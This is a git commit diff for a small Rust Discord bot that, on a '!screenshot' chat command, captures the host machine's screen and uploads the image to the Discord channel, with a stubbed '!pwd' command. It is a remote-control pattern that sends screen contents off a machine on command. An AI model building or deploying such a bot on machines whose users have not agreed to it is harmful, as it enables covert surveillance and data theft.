b677f56f404580fadba545db22a51053e43e9086
AlianZip <vovak01.01@gmail.com>
2024-04-05 00:12:22 +0300

    make screenshot

--- src/dowithsys/mod.rs
+++ src/dowithsys/mod.rs
@@ -1,70 +1,15 @@
-use scrap::{Capturer, Display};
-use std::io::{ErrorKind::WouldBlock, Read};
-use std::thread;
-use std::fs::File;
-use std::time::Duration;
-use image::{codecs::png::PngEncoder, ImageEncoder, Rgb, RgbImage};
-use std::convert::TryInto;
+use serenity::all::CreateAttachment;
+use xcap::Monitor;
 
-pub fn make_screenshot() -> Vec<u8>{
-    let one_second = Duration::new(1, 0);
-    let one_frame = one_second / 60;
+pub async fn make_screenshot() -> CreateAttachment {
+    let monitors = Monitor::all().unwrap();
 
-    let display = Display::primary().expect("Couldn't find primary display.");
-    let mut capturer = Capturer::new(display).expect("Couldn't begin capture.");
-    let (w, h) = (capturer.width(), capturer.height());
+    let imagee = monitors[0].capture_image().unwrap();
+    let _ = imagee.save("screenshot.png");
 
+    let ch = CreateAttachment::path("screenshot.png").await;
+    let _ = std::fs::remove_file("screenshot.png");
 
-    loop {
-
-        let buffer = match capturer.frame() {
-            Ok(buffer) => buffer,
-            Err(error) => {
-                if error.kind() == WouldBlock {
-                    thread::sleep(one_frame);
-                    continue;
-                } else {
-                    panic!("Error: {}", error);
-                }
-            }
-        };
-        
-
-
-        let mut bitflipped = Vec::with_capacity(w * h * 4);
-        let stride = buffer.len() / h;
-
-        for y in 0..h {
-            for x in 0..w {
-                let i = stride * y + 4 * x;
-                bitflipped.extend_from_slice(&[
-                    buffer[i + 2],
-                    buffer[i + 1],
-                    buffer[i],
-                    255,
-                ]);
-            }
-        }
-        let data: Result<Vec<_>, _> = buffer.bytes().collect();
-
-        let mut img = RgbImage::from_vec(w as u32, h as u32, data.unwrap()).unwrap();
-        for x in 0u32..32 {
-            for y in 0u32..32 {
-                let r = ((x + y) % 4).try_into().unwrap();
-                let g = 255 - r;
-                let b = 127 - r;
-                img.put_pixel(x, y, Rgb([r, g, b]));
-            }
-        }
-
-        let mut cursor = std::io::Cursor::new(Vec::new());
-        let encoder = PngEncoder::new(&mut cursor);
-        encoder
-            .write_image(&img, h as u32, w as u32, image::ExtendedColorType::Rgb8)
-            .expect("msg");
-
-        let bytes = cursor.into_inner();
-        return bytes;
-    }
-    
+    return ch.unwrap();
 }
+
--- src/main.rs
+++ src/main.rs
@@ -2,19 +2,68 @@
 
 mod dowithsys;
 
-use dowithsys::make_screenshot;
-use serenity::all::{CreateAttachment, CreateMessage};
+use dowithsys::{make_screenshot};
+use once_cell::unsync::Lazy;
+use serde::Deserialize;
+use serde_json;
+use serenity::all::CreateMessage;
 use serenity::async_trait;
 use serenity::model::channel::Message;
 use serenity::prelude::*;
-use serde_json;
-use serde::Deserialize;
-use std::io::Cursor;
+use std::env::current_dir;
 
 #[allow(dead_code)]
 #[derive(Deserialize)]
 struct Config {
     TOKEN: String,
+}
+
+static mut NOW_PATH: Lazy<String> = Lazy::new(|| {current_dir().unwrap().to_str().unwrap().to_string()});
+
+
+
+struct Handler;
+
+#[async_trait]
+impl EventHandler for Handler {
+    async fn message(&self, ctx: Context, msg: Message) {
+        if msg.content.chars().next().unwrap() == '!' {
+            let _ = match rem_first(&msg.content) {
+                "ping" => msg.channel_id.say(&ctx.http, "pong!").await,
+                "screenshot" => {
+                    let ch = make_screenshot().await;
+                    msg.channel_id
+                        .send_message(&ctx.http, CreateMessage::new().add_file(ch))
+                        .await
+                }
+                "pwd" => {
+                    todo!();
+                }
+
+
+                _ => todo!(),
+            };
+        }
+    }
+}
+
+#[tokio::main]
+async fn main() {
+    let token = config_reader().TOKEN;
+
+    let intents = GatewayIntents::GUILD_MESSAGES
+        | GatewayIntents::DIRECT_MESSAGES
+        | GatewayIntents::MESSAGE_CONTENT;
+
+    let mut client = Client::builder(&token, intents)
+        .event_handler(Handler)
+        .await
+        .unwrap();
+
+    // Start listening for events by starting a single shard
+    if let Err(why) = client.start().await {
+        println!("Error client started: {why:?}");
+    }
 }
 
 #[allow(dead_code)]
@@ -24,35 +73,8 @@ fn config_reader() -> Config {
     return des;
 }
 
-struct Handler;
-
-#[async_trait]
-impl EventHandler for Handler {
-    async fn message(&self, ctx: Context, msg: Message) {
-        if msg.content == "!ping" {
-            let cr = CreateAttachment::bytes(make_screenshot(), "screenshot.png");
-            if let Err(why) = msg.channel_id.send_message(&ctx.http, CreateMessage::new().add_file(cr)).await {
-                println!("Error sending message: {why:?}");
-            }
-        }
-    }
+fn rem_first(value: &str) -> &str {
+    let mut chars = value.chars();
+    chars.next();
+    chars.as_str()
 }
-
-#[tokio::main]
-async fn main() {
-    let token  = config_reader().TOKEN;
-    
-    let intents = GatewayIntents::GUILD_MESSAGES
-        | GatewayIntents::DIRECT_MESSAGES
-        | GatewayIntents::MESSAGE_CONTENT;
-
-    let mut client =
-        Client::builder(&token, intents).event_handler(Handler).await.unwrap();
-
-    // Start listening for events by starting a single shard
-    if let Err(why) = client.start().await {
-        println!("Error client started: {why:?}");
-    }
-}
-
-
